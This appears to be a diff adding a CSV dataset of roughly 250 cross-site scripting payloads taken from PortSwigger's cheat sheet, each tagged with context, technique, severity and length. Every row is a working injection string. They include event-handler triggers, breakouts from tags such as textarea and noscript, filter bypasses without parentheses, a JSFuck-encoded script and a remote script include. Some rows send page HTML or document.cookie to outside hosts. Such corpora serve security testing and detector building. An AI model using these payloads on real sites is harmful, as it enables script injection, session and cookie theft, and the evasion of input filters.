@@ -1,0 +1,633 @@
+payload,context,technique,severity,length,source
+"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><xss id=x style=""position:absolute;"" onanimationcancel=""print()""></xss>",attribute,event_handler,high,175,portswigger
+"<style>@keyframes x{}</style><xss style=""animation-name:x"" onanimationend=""alert(1)""></xss>",attribute,event_handler,high,91,portswigger
+"<style>@keyframes slidein {}</style><xss style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></xss>",attribute,event_handler,high,160,portswigger
+"<style>@keyframes x{}</style><xss style=""animation-name:x"" onanimationstart=""alert(1)""></xss>",attribute,event_handler,high,93,portswigger
+<xss id=x onbeforematch=alert(1) hidden=until-found>,event_handler,event_handler,medium,52,portswigger
+<body onbeforeprint=console.log(1)>,event_handler,event_handler,medium,35,portswigger
+"<body onbeforeunload=navigator.sendBeacon('//ssl.portswigger-labs.net/',document.body.innerHTML)>",dom_sink,obfuscation,medium,97,portswigger
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>,event_handler,event_handler,high,54,portswigger
+"<audio oncanplay=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",event_handler,event_handler,medium,80,portswigger
+"<video oncanplaythrough=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",event_handler,event_handler,medium,87,portswigger
+<xss oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto>,event_handler,event_handler,medium,93,portswigger
+<input type=hidden oncontentvisibilityautostatechange=alert(1) style=content-visibility:auto>,event_handler,event_handler,medium,93,portswigger
+"<video controls><source src=validvideo.mp4 type=video/mp4><track default oncuechange=alert(1) src=""data:text/vtt,WEBVTT FILE
+
+1
+00:00:00.000 --> 00:00:05.000 
+<b>XSS</b>
+""></video>",event_handler,event_handler,medium,180,portswigger
+<audio controls ondurationchange=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>,event_handler,event_handler,medium,93,portswigger
+<svg><animate onend=alert(1) attributeName=x dur=1s>,event_handler,event_handler,medium,52,portswigger
+"<audio controls autoplay onended=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",event_handler,event_handler,medium,96,portswigger
+<audio src/onerror=alert(1)>,event_handler,event_handler,high,28,portswigger
+<a id=x tabindex=1 onfocus=alert(1)></a>,event_handler,event_handler,high,40,portswigger
+<xss onfocus=alert(1) autofocus tabindex=1>,event_handler,event_handler,high,43,portswigger
+<a id=x tabindex=1 onfocusin=alert(1)></a>,event_handler,event_handler,medium,42,portswigger
+"<body onhashchange=""print()"">",event_handler,event_handler,medium,29,portswigger
+<body onload=alert(1)>,event_handler,event_handler,high,22,portswigger
+"<audio onloadeddata=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",event_handler,event_handler,medium,83,portswigger
+"<audio autoplay onloadedmetadata=alert(1)> <source src=""validaudio.wav"" type=""audio/wav""></audio>",event_handler,event_handler,medium,97,portswigger
+"<video onloadstart=""alert(1)""><source></xss>",event_handler,event_handler,medium,44,portswigger
+<body onmessage=print()>,event_handler,event_handler,medium,24,portswigger
+<body onpagereveal=alert(1)>,event_handler,event_handler,medium,28,portswigger
+<body onpageshow=alert(1)>,event_handler,event_handler,medium,26,portswigger
+"<audio autoplay onplay=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",event_handler,event_handler,medium,86,portswigger
+"<audio autoplay onplaying=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",event_handler,event_handler,medium,89,portswigger
+<body onpopstate=print()>,event_handler,event_handler,medium,25,portswigger
+<audio controls onprogress=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>,event_handler,event_handler,medium,87,portswigger
+<svg><animate onrepeat=alert(1) attributeName=x dur=1s repeatCount=2 />,event_handler,event_handler,medium,71,portswigger
+"<body onresize=""print()"">",event_handler,event_handler,medium,25,portswigger
+<body onscroll=alert(1)><div style=height:1000px></div><div id=x></div>,event_handler,event_handler,medium,71,portswigger
+"<xss onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></xss>",event_handler,event_handler,medium,270,portswigger
+<address onscrollsnapchange=alert(1) style=overflow-y:hidden;scroll-snap-type:x><div style=scroll-snap-align:center>1337</div></address>,event_handler,event_handler,medium,136,portswigger
+"<style>.scroll-container { overflow-x: scroll; scroll-snap-type: x mandatory; display: flex; width: 300px; } .scroll-item { flex: 0 0 500px; scroll-snap-align: start; } .scroll-item:first-child { animation: sample; animation-duration: 0.1s; } @keyframes sample { 100% { scroll-snap-align: none; } }</style><x class=""scroll-container"" onscrollsnapchanging=""alert(1)""> <xss class=""scroll-item"">Item 1</xss><xss class=""scroll-item"">Item 2</xss></xss>",attribute,event_handler,medium,447,portswigger
+<xss onsecuritypolicyviolation=alert(1)>XSS</xss>,event_handler,event_handler,medium,49,portswigger
+x<template shadowrootmode=open><slot onslotchange=alert(1)>,event_handler,event_handler,medium,59,portswigger
+<audio controls onsuspend=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>,event_handler,event_handler,medium,86,portswigger
+"<audio controls autoplay ontimeupdate=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",event_handler,event_handler,medium,101,portswigger
+<details ontoggle=alert(1) open>test</details>,event_handler,event_handler,high,46,portswigger
+"<style>:target {color: red;}</style><xss id=x style=""transition:color 10s"" ontransitioncancel=print()></xss>",attribute,event_handler,medium,108,portswigger
+"<xss id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></xss>",attribute,event_handler,medium,82,portswigger
+"<style>:target {transform: rotate(180deg);}</style><xss id=x style=""transition:transform 2s"" ontransitionrun=print()></xss>",attribute,event_handler,medium,123,portswigger
+"<style>:target {color:red;}</style><xss id=x style=""transition:color 1s"" ontransitionstart=alert(1)></xss>",attribute,event_handler,medium,106,portswigger
+<body onunhandledrejection=alert(1)><script>fetch('//xyz')</script>,script_injection,obfuscation,high,67,portswigger
+"<body onunload=navigator.sendBeacon('//ssl.portswigger-labs.net/',document.body.innerHTML)>",dom_sink,obfuscation,medium,91,portswigger
+<geolocation onvalidationstatuschange=alert(1)>,event_handler,event_handler,medium,47,portswigger
+<audio controls loop muted autoplay onwaiting=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>,event_handler,event_handler,medium,106,portswigger
+"<style>@keyframes x{}</style><xss style=""animation-name:x"" onwebkitanimationend=""alert(1)""></xss>",attribute,event_handler,medium,97,portswigger
+"<style>@keyframes slidein {}</style><xss style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></xss>",attribute,event_handler,medium,166,portswigger
+"<style>@keyframes x{}</style><xss style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></xss>",attribute,event_handler,medium,99,portswigger
+<audio onwebkitplaybacktargetavailabilitychanged=alert(1)>,event_handler,event_handler,medium,58,portswigger
+"<style>:target {color:red;}</style><xss id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></xss>",attribute,event_handler,medium,110,portswigger
+<body onafterprint=alert(1)>,event_handler,event_handler,medium,28,portswigger
+<input onauxclick=alert(1)>,event_handler,event_handler,medium,27,portswigger
+"<a onbeforecopy=""alert(1)"" contenteditable>test</a>",event_handler,event_handler,medium,51,portswigger
+"<a onbeforecut=""alert(1)"" contenteditable>test</a>",event_handler,event_handler,medium,50,portswigger
+<xss contenteditable onbeforeinput=alert(1)>test,event_handler,event_handler,medium,48,portswigger
+<xss onbeforepaste=alert(1)>XSS</xss>,event_handler,event_handler,medium,37,portswigger
+<button popovertarget=x>Click me</button><xss onbeforetoggle=alert(1) popover id=x>XSS</xss>,event_handler,event_handler,medium,92,portswigger
+<xss onblur=alert(1) id=x tabindex=1 style=display:block>test</xss><input value=clickme>,event_handler,event_handler,medium,88,portswigger
+<input type=file oncancel=alert(1)>,event_handler,event_handler,medium,35,portswigger
+<input onchange=alert(1) value=xss>,event_handler,event_handler,medium,35,portswigger
+"<xss onclick=""alert(1)"" style=display:block>test</xss>",event_handler,event_handler,medium,54,portswigger
+<dialog open onclose=alert(1)><form method=dialog><button>XSS</button></form>,event_handler,event_handler,medium,77,portswigger
+<button commandfor=test command=show-popover>Click<div id=test oncommand=alert(1)>,event_handler,event_handler,medium,82,portswigger
+"<xss oncontextmenu=""alert(1)"" style=display:block>test</xss>",event_handler,event_handler,medium,60,portswigger
+"<xss oncopy=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",event_handler,event_handler,high,78,portswigger
+"<xss oncut=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",event_handler,event_handler,high,77,portswigger
+"<xss ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>test</xss>",event_handler,event_handler,high,78,portswigger
+"<xss draggable=""true"" ondrag=""alert(1)"" style=display:block>test</xss>",attribute,event_handler,medium,70,portswigger
+"<xss draggable=""true"" ondragend=""alert(1)"" style=display:block>test</xss>",attribute,event_handler,medium,73,portswigger
+"<xss draggable=""true"" ondragenter=""alert(1)"" style=display:block>test</xss>",attribute,event_handler,medium,75,portswigger
+"<xss draggable=""true"" ondragexit=""alert(1)"" style=display:block>test</xss>",attribute,event_handler,medium,74,portswigger
+"<xss draggable=""true"" ondragleave=""alert(1)"" style=display:block>test</xss>",attribute,event_handler,medium,75,portswigger
+"<div draggable=""true"" contenteditable>drag me</div><xss ondragover=alert(1) contenteditable style=display:block>drop here</xss>",attribute,event_handler,medium,127,portswigger
+"<xss draggable=""true"" ondragstart=""alert(1)"" style=display:block>test</xss>",attribute,event_handler,medium,75,portswigger
+"<div draggable=""true"" contenteditable>drag me</div><xss ondrop=alert(1) contenteditable style=display:block>drop here</xss>",attribute,event_handler,medium,123,portswigger
+<xss onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</xss><input value=clickme>,event_handler,event_handler,high,97,portswigger
+"<form onformdata=""alert(1)""><button>Click</button></form>",event_handler,event_handler,medium,57,portswigger
+<video onfullscreenchange=alert(1) src=validvideo.mp4 controls>,event_handler,event_handler,medium,63,portswigger
+<div ongesturechange=alert(1)>XSS</div>,event_handler,event_handler,medium,39,portswigger
+<div ongestureend=alert(1)>XSS</div>,event_handler,event_handler,medium,36,portswigger
+<div ongesturestart=alert(1)>XSS</div>,event_handler,event_handler,medium,38,portswigger
+<input type=range ongotpointercapture=alert(1)>,event_handler,event_handler,medium,47,portswigger
+<input oninput=alert(1) value=xss>,event_handler,event_handler,medium,34,portswigger
+<form><input oninvalid=alert(1) required><input type=submit>,event_handler,event_handler,medium,60,portswigger
+"<xss onkeydown=""alert(1)"" contenteditable style=display:block>test</xss>",event_handler,event_handler,medium,72,portswigger
+"<xss onkeypress=""alert(1)"" contenteditable style=display:block>test</xss>",event_handler,event_handler,medium,73,portswigger
+"<xss onkeyup=""alert(1)"" contenteditable style=display:block>test</xss>",event_handler,event_handler,medium,70,portswigger
+<geolocation autolocate onlocation=alert(1)>,event_handler,event_handler,medium,44,portswigger
+<input type=range onlostpointercapture=alert(1)>,event_handler,event_handler,medium,48,portswigger
+"<xss onmousedown=""alert(1)"" style=display:block>test</xss>",event_handler,event_handler,medium,58,portswigger
+"<xss onmouseenter=""alert(1)"" style=display:block>test</xss>",event_handler,event_handler,medium,59,portswigger
+"<xss onmouseleave=""alert(1)"" style=display:block>test</xss>",event_handler,event_handler,medium,59,portswigger
+"<xss onmousemove=""alert(1)"" style=display:block>test</xss>",event_handler,event_handler,medium,58,portswigger
+"<xss onmouseout=""alert(1)"" style=display:block>test</xss>",event_handler,event_handler,medium,57,portswigger
+"<xss onmouseover=""alert(1)"" style=display:block>test</xss>",event_handler,event_handler,medium,58,portswigger
+"<xss onmouseup=""alert(1)"" style=display:block>test</xss>",event_handler,event_handler,medium,56,portswigger
+<xss onmousewheel=alert(1) style=display:block>requires scrolling,event_handler,event_handler,medium,65,portswigger
+<video onmozfullscreenchange=alert(1) src=validvideo.mp4 controls>,event_handler,event_handler,medium,66,portswigger
+"<body onpagehide=navigator.sendBeacon('//ssl.portswigger-labs.net/',document.body.innerHTML)>",dom_sink,obfuscation,medium,93,portswigger
+"<body onpageswap=navigator.sendBeacon('//ssl.portswigger-labs.net/',document.body.innerHTML)>",dom_sink,obfuscation,medium,93,portswigger
+"<a onpaste=""alert(1)"" contenteditable>test</a>",event_handler,event_handler,medium,46,portswigger
+"<audio autoplay controls onpause=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",event_handler,event_handler,medium,96,portswigger
+<xss onpointercancel=alert(1)>XSS</xss>,event_handler,event_handler,medium,39,portswigger
+<xss onpointerdown=alert(1) style=display:block>XSS</xss>,event_handler,event_handler,medium,57,portswigger
+<xss onpointerenter=alert(1) style=display:block>XSS</xss>,event_handler,event_handler,high,58,portswigger
+<xss onpointerleave=alert(1) style=display:block>XSS</xss>,event_handler,event_handler,medium,58,portswigger
+<xss onpointermove=alert(1) style=display:block>XSS</xss>,event_handler,event_handler,medium,57,portswigger
+<xss onpointerout=alert(1) style=display:block>XSS</xss>,event_handler,event_handler,medium,56,portswigger
+<xss onpointerover=alert(1) style=display:block>XSS</xss>,event_handler,event_handler,medium,57,portswigger
+<xss onpointerrawupdate=alert(1) style=display:block>XSS</xss>,event_handler,event_handler,medium,62,portswigger
+<xss onpointerup=alert(1) style=display:block>XSS</xss>,event_handler,event_handler,medium,55,portswigger
+<geolocation onpromptaction=alert(1)>,event_handler,event_handler,medium,37,portswigger
+<geolocation onpromptdismiss=alert(1)>,event_handler,event_handler,medium,38,portswigger
+"<audio controls autoplay onratechange=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",event_handler,event_handler,medium,101,portswigger
+<form onreset=alert(1)><input type=reset>,event_handler,event_handler,medium,41,portswigger
+"<form><input type=search onsearch=alert(1) value=""Hit return"" autofocus>",event_handler,event_handler,high,72,portswigger
+"<audio autoplay controls onseeked=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",event_handler,event_handler,medium,97,portswigger
+"<audio autoplay controls onseeking=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",event_handler,event_handler,medium,98,portswigger
+"<input onselect=alert(1) value=""XSS"" autofocus>",event_handler,event_handler,high,47,portswigger
+<body onselectionchange=alert(1)>select some text,event_handler,event_handler,medium,49,portswigger
+<body onselectstart=alert(1)>select some text,event_handler,event_handler,medium,45,portswigger
+<form onsubmit=alert(1)><input type=submit>,event_handler,event_handler,medium,43,portswigger
+<button popovertarget=x>Click me</button><xss ontoggle=alert(1) popover id=x>XSS</xss>,event_handler,event_handler,high,86,portswigger
+<xss ontouchcancel=alert(1)>XSS</xss>,event_handler,event_handler,medium,37,portswigger
+<body ontouchend=alert(1)>,event_handler,event_handler,medium,26,portswigger
+<body ontouchmove=alert(1)>,event_handler,event_handler,medium,27,portswigger
+<body ontouchstart=alert(1)>,event_handler,event_handler,medium,28,portswigger
+"<audio autoplay controls onvolumechange=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",event_handler,event_handler,medium,103,portswigger
+<audio controls onwaiting=alert(1)><source src=x type=x></audio>,event_handler,event_handler,medium,64,portswigger
+<video controls src=validvideo.mp4 onwebkitfullscreenchange=alert(1)>,event_handler,event_handler,medium,69,portswigger
+<xss onwebkitmouseforcechanged=alert(1)>XSS</xss>,event_handler,event_handler,medium,49,portswigger
+<xss onwebkitmouseforcedown=alert(1)>XSS</xss>,event_handler,event_handler,medium,46,portswigger
+<xss onwebkitmouseforceup=alert(1)>XSS</xss>,event_handler,event_handler,medium,44,portswigger
+<xss onwebkitmouseforcewillbegin=alert(1)>XSS</xss>,event_handler,event_handler,medium,51,portswigger
+<video controls src=validvideo.mp4 onwebkitpresentationmodechanged=alert(1)>,event_handler,event_handler,medium,76,portswigger
+<xss onwebkitwillrevealbottom=alert(1)>XSS</xss>,event_handler,event_handler,medium,48,portswigger
+<body onwheel=alert(1)>,event_handler,event_handler,medium,23,portswigger
+"<noembed><img title=""</noembed><img src onerror=alert(1)>""></noembed>",attribute,event_handler,high,69,portswigger
+"<noscript><img title=""</noscript><img src onerror=alert(1)>""></noscript>",attribute,event_handler,high,72,portswigger
+"<style><img title=""</style><img src onerror=alert(1)>""></style>",attribute,event_handler,high,63,portswigger
+"<script><img title=""</script><img src onerror=alert(1)>""></script>",script_injection,event_handler,high,66,portswigger
+"<iframe><img title=""</iframe><img src onerror=alert(1)>""></iframe>",attribute,event_handler,high,66,portswigger
+"<xmp><img title=""</xmp><img src onerror=alert(1)>""></xmp>",attribute,event_handler,high,57,portswigger
+"<textarea><img title=""</textarea><img src onerror=alert(1)>""></textarea>",attribute,event_handler,high,72,portswigger
+"<noframes><img title=""</noframes><img src onerror=alert(1)>""></noframes>",attribute,event_handler,high,72,portswigger
+"<title><img title=""</title><img src onerror=alert(1)>""></title>",attribute,event_handler,high,63,portswigger
+"<script>eval(myUndefVar);var inject=""INJECTION_STARTS_HERE"";var myUndefVar;alert(1);//"";</script>",dom_sink,obfuscation,high,97,portswigger
+"<script>myUndefFunction(13,37);var inject=""INJECTION_STARTS_HERE"";function myUndefFunction(){};alert(1);//"";</script>",script_injection,obfuscation,high,117,portswigger
+"<script>var myUndefObject = new myUndefClass();var inject=""INJECTION_STARTS_HERE"";function myUndefClass(){};alert(1);//"";</script>",script_injection,obfuscation,high,130,portswigger
+"<script>$(document).ready(function(){var inject=""INJECTION_STARTS_HERE"";});function $(){return{ready:()=>0}};alert(1);(function(){"""";});</script>",script_injection,script_tag,high,145,portswigger
+"<script>undef01.undef02(""INJECTION""+alert(1));function undef01(){}//"");</script>",script_injection,obfuscation,high,80,portswigger
+"<script>undef01['undef02','INJECTION'+alert(1)];function undef01(){};//'];</script>",script_injection,obfuscation,high,83,portswigger
+"<script type=""module"">undef01.undef02.undef03.undef04.undef05();var inject = ""INJECTION"";import ""data:text/jscript,alert(1)""//"";</script>",script_injection,obfuscation,high,137,portswigger
+"<script>var x=atob(""dXNlbGVzcyBjYWxsIG9mIG5hdGl2ZSBmdW5jdGlvbiAh"");undef01.undef02();var inject = ""INJECTION"";function atob(){alert(1);}//"";</script>",script_injection,obfuscation,high,149,portswigger
+"<input type=""file"" id=""fileInput"" /><script>const fileInput = document.getElementById('fileInput');const dataTransfer = new DataTransfer();const file = new File(['Hello world!'], 'hello.txt', {type: 'text/plain'});dataTransfer.items.add(file);fileInput.files = dataTransfer.files</script>",script_injection,script_tag,high,288,portswigger
+<script>onerror=alert;throw 1</script>,script_injection,restricted_chars,high,38,portswigger
+<script>{onerror=alert}throw 1</script>,script_injection,restricted_chars,high,39,portswigger
+"<script>throw onerror=alert,1</script>",script_injection,restricted_chars,high,38,portswigger
+"<script>throw onerror=eval,'=alert\x281\x29'</script>",script_injection,restricted_chars,high,53,portswigger
+"<script>throw onerror=eval,'alert\x281\x29'</script>",script_injection,restricted_chars,high,52,portswigger
+"<script>{onerror=eval}throw{lineNumber:1,columnNumber:1,fileName:1,message:'alert\x281\x29'}</script>",script_injection,restricted_chars,high,101,portswigger
+"<script>throw onerror=eval,e=new Error,e.message='alert\x281\x29',e</script>",script_injection,restricted_chars,high,76,portswigger
+"<script>throw onerror=Uncaught=eval,e=new Error,e.message='/*'+location.hash,!!window.InstallTrigger?e:e.message</script>",script_injection,restricted_chars,high,121,portswigger
+"<script>throw{},onerror=Uncaught=eval,h=location.hash,e={lineNumber:1,columnNumber:1,fileName:0,message:h[2]+h[1]+h},!!window.InstallTrigger?e:e.message</script>",script_injection,restricted_chars,high,161,portswigger
+"<script>throw/x/,onerror=Uncaught=eval,h=location.hash,e=Error,e.lineNumber=e.columnNumber=e.fileName=e.message=h[2]+h[1]+h,!!window.InstallTrigger?e:e.message</script>",script_injection,restricted_chars,high,168,portswigger
+<script>'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}</script>,script_injection,restricted_chars,high,70,portswigger
+<script>'alert\x281\x29'instanceof{[Symbol['hasInstance']]:eval}</script>,script_injection,restricted_chars,high,73,portswigger
+<script>location='javascript:alert\x281\x29'</script>,script_injection,restricted_chars,high,53,portswigger
+<script>location=name</script>,script_injection,restricted_chars,high,30,portswigger
+<script>alert`1`</script>,script_injection,restricted_chars,high,25,portswigger
+<script>new Function`X${document.location.hash.substr`1`}`</script>,template_injection,restricted_chars,high,67,portswigger
+<script>Function`X${document.location.hash.substr`1`}```</script>,template_injection,restricted_chars,high,65,portswigger
+<video><source onerror=location=/\02.rs/+document.cookie>,event_handler,restricted_chars,high,57,portswigger
+<svg onload=alert(1),event_handler,restricted_chars,high,20,portswigger
+<svg onload=alert(1)<!--,event_handler,restricted_chars,high,24,portswigger
+"<script>throw[onerror]=[alert],1</script>",script_injection,restricted_chars,high,41,portswigger
+<script>var{a:onerror}={a:alert};throw 1</script>,script_injection,restricted_chars,high,49,portswigger
+<script>var{haha:onerror=alert}=0;throw 1</script>,script_injection,restricted_chars,high,50,portswigger
+<script>window.name='javascript:alert(1)';</script><svg onload=location=name>,script_injection,restricted_chars,high,77,portswigger
+"<script>window.name='javascript:alert(1)';function blah(){}
+blah(""""+{a:location=name}+"""")</script>",script_injection,restricted_chars,high,98,portswigger
+"<script>window.name='javascript:alert(1)';function blah(){}
+blah(""""+new class b{toString=e=>location=name}+"""")</script>",script_injection,restricted_chars,high,119,portswigger
+<SCRIPT SRC=HTTPS://PORTSWIGGER-LABS.NET/A.JS></SCRIPT>,script_injection,restricted_chars,high,55,portswigger
+<SCRIPT>[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[+!+[]+[!+[]+!+[]+!+[]]]+[+!+[]]+([+[]]+![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[!+[]+!+[]+[+[]]])</SCRIPT>,script_injection,restricted_chars,high,2362,portswigger
+"<script>throw onerror=eval,name</script>",script_injection,restricted_chars,high,40,portswigger
+"<script>throw onerror=eval,'/*'+location</script>",script_injection,restricted_chars,high,49,portswigger
+"<svg onload=""throw top.onerror=eval,'/*'+URL"">",attribute,restricted_chars,high,46,portswigger
+"<body onload=""throw onerror=eval,'/*'+location"">",attribute,restricted_chars,high,48,portswigger
+<script>ondevicemotion=setTimeout;Event.prototype.toString=URIError.prototype.toString;Event.prototype.message='alert\x281\x29'</script>,script_injection,restricted_chars,high,136,portswigger
+<script>ondeviceorientation=setTimeout;Event.prototype.toString=Error.prototype.toString;Event.prototype.name='alert\x281\x29'</script>,script_injection,restricted_chars,high,135,portswigger
+<script>ondeviceorientationabsolute=setTimeout;Event.prototype.toString=WebTransportError.prototype.toString;Event.prototype.name='alert\x281\x29'</script>,script_injection,restricted_chars,high,155,portswigger
+<script>onpagereveal=setTimeout;Event.prototype.toString=AggregateError.prototype.toString;Event.prototype.name='alert\x281\x29'</script>,script_injection,restricted_chars,high,137,portswigger
+<script>onpageswap=setTimeout;location='x';Event.prototype.toString=EvalError.prototype.toString;Event.prototype.name='alert\x281\x29'</script>,script_injection,restricted_chars,high,143,portswigger
+"<iframe id=target></iframe><script>target.src='xss.php?x=<img/src/onerror=onmessage=setTimeout;Event.prototype.toString=RangeError.prototype.toString;Event.prototype.name=""alert\x281\x29"">';target.onload=setTimeout(function(){frames[0].postMessage("""", ""*"")},100)</script>",dom_sink,restricted_chars,high,271,portswigger
+<script>onhashchange=setTimeout;location.hash=location;Event.prototype.flags='.call\x28alert\x281\x29\x29';Event.prototype.toString=/x/.toString</script>,script_injection,restricted_chars,high,153,portswigger
+<script>onscroll=setTimeout;document.body.style.height='9999px';document.documentElement.scrollTop=1;Event.prototype.toString=ReferenceError.prototype.toString;Event.prototype.name='alert\x281\x29'</script>,script_injection,restricted_chars,high,206,portswigger
+<script>onscrollend=setTimeout;document.body.style.height='9999px';document.documentElement.scrollTop=1;Event.prototype.toString=SyntaxError.prototype.toString;Event.prototype.name='alert\x281\x29'</script>,script_injection,restricted_chars,high,206,portswigger
+"<input value=x autofocus onfocus=""window.onselect=setTimeout;this.selectionStart=1;Event.prototype.toString=TypeError.prototype.toString;Event.prototype.message='alert\x281\x29'"">",attribute,restricted_chars,high,179,portswigger
+"<img/src/style=transition:0.1s onerror=""window.ontransitionstart=setTimeout;this.style.opacity=0;Event.prototype.toString=x=>'alert\x281\x29'"">",attribute,restricted_chars,high,143,portswigger
+"<img/src/onerror=""window.onload=setTimeout;Event.prototype.toString=DOMException.prototype.toString;Event.prototype.name='alert\x281\x29'"">",attribute,restricted_chars,high,139,portswigger
+<img/src/onerror=onpageshow=setTimeout;Event.prototype.toString=WebTransportError.prototype.toString;Event.prototype.name='alert\x281\x29'>,event_handler,restricted_chars,high,139,portswigger
+<img/src/onerror=window.onerror=eval;ReferenceError.prototype.name=';alert\x281\x29;var\x20Uncaught//';z>,event_handler,restricted_chars,high,105,portswigger
+"<svg onload=onerror=eval;new'""-alert\x281\x29//'>",event_handler,restricted_chars,high,49,portswigger
+"<script>onerror=eval,new name</script>",script_injection,restricted_chars,high,38,portswigger
+"<script>throw onerror=eval,x=new Error,x.message='alert\x281\x29',x</script>",script_injection,restricted_chars,high,76,portswigger
+"<script>throw onerror=eval,x=new Error,x.name='',x.message='=alert\x281\x29',x</script>",script_injection,restricted_chars,high,87,portswigger
+"<img src onerror=src=1,attributes[1].value=alt+id alt=ale id=rt&lpar;1&rpar;>",event_handler,restricted_chars,high,77,portswigger
+"<svg onload=""attributes[0].value=name,new onload"">",event_handler,restricted_chars,high,50,portswigger
+"<svg onload=""attributes[0].value=id+URL+id,new onload"" id=`>",event_handler,restricted_chars,high,60,portswigger
+"<input onfocus=""attributes[0].value=id+URL+id,new onfocus"" id=` autofocus>",event_handler,restricted_chars,high,74,portswigger
+<input onclick=attributes[0].value='`'+URL+'`'>,event_handler,restricted_chars,medium,47,portswigger
